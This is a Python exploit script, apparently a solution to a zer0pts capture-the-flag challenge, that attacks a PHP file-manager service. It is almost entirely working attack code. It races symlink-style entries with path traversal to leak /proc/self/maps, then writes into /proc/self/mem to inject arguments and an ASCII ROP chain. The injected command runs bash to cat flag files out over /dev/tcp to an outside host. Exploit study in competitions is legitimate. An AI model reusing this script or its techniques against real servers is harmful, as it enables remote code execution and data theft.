from ptrlib import *
from encoder import ascii_encode
import requests
import threading
import re
import hashlib
import time

#URL = "http://virt-challenge.zer0pts.com:9080/"
URL = "http://localhost:9080/"

# We need multiple sessions because MPM uses one process per session
r = requests.get(URL)
cookies_w = r.cookies
cookie_list = [requests.get(URL).cookies for i in range(10)]
dirname1 = hashlib.md5(cookies_w['PHPSESSID'].encode()).hexdigest()

def create(name, target=None, cookies=None):
    if cookies is None: cookies = cookies_w
    if target is None:
        r = requests.post(URL,
                          data={'mode':'create', 'name':name},
                          cookies=cookies)
    else:
        r = requests.post(URL,
                          data={'mode':'create', 'name':name, 'type':1, 'target':target},
                          cookies=cookies)
    return r

def read(name, offset=0, size=-1, cookies=None):
    if cookies is None: cookies = cookies_w
    r = requests.post(URL,
                      data={'mode':'read', 'name':name, 'offset':offset, 'size':size},
                      cookies=cookies)
    return r

def write(name, data, offset=0, cookies=None):
    if cookies is None: cookies = cookies_w
    r = requests.post(URL,
                      data={'mode':'write', 'name':name, 'offset':offset, 'data':data},
                      cookies=cookies)
    return r

def delete(name, cookies=None):
    if cookies is None: cookies = cookies_w
    r = requests.post(URL,
                      data={'mode':'delete', 'name':name},
                      cookies=cookies)
    return r

proc_base = 0
win = False

def reader(cookies):
    global proc_base, win
    while not win:
        print("b", end="", flush=True)
        r = read("evil", cookies=cookies)
        if "r-xp" in r.text:
            break
    else:
        return
    leak = re.findall("([0-9a-f]+)\-[0-9a-f]+ r\-\-p", r.text)[0]
    proc_base = int(leak, 16)
    win = True

def linker():
    global win
    while not win:
        print("a", end="", flush=True)
        delete("victim", cookies=cookies_w)
        create("evil", "../../../../../../../../../../../../../proc/self/maps", cookies=cookies_w)
        delete("victim", cookies=cookies_w)
        create("evil", "../../../../../../../../../../../../../var/www/html/index.php", cookies=cookies_w)

# (1) Leak proc base
# user1/evil --> {/proc/self/maps or /var/www/html/index.php}
create("victim", cookies=cookies_w)
create("middle", "victim", cookies=cookies_w)
create("evil", "middle", cookies=cookies_w)
# userN/evil --> user1/middle
for cookies in cookie_list:
    create("victim", cookies=cookies)
    create("middle", "victim", cookies=cookies)
    create("evil", "middle", cookies=cookies)
    delete("victim", cookies=cookies)
    create("evil", f"../{dirname1}/middle", cookies=cookies)
#"""
tw = threading.Thread(target=linker)
trs = [threading.Thread(target=reader, args=(cookies,))
       for cookies in cookie_list]
tw.start()
[tr.start() for tr in trs]
tw.join()
[tr.join() for tr in trs]
"""
proc_base = 0x5584d13fa000
#"""
logger.info("proc = " + hex(proc_base))

ap_unixd_accept_call = 0x7e68c

# (2) Inject args
for i in range(10):
    delete("victim", cookies=cookies_w)
    create("evil", "../../../../../../../../../../../../../proc/self/mem", cookies=cookies_w)
    offset = proc_base
    data = b'/bin/bash\0-c\0/bin/cat /flag*>/dev/tcp/moxxie.tk/18001'
    write("evil", data, offset, cookies=cookies_w)

    time.sleep(1)
    # (3) ASCII ROP to win!
    offset = proc_base + ap_unixd_accept_call # ap_unixd_accept+0x2c
    data = ascii_encode(proc_base)
    write("evil", data, offset, cookies=cookies_w)

    print(i)
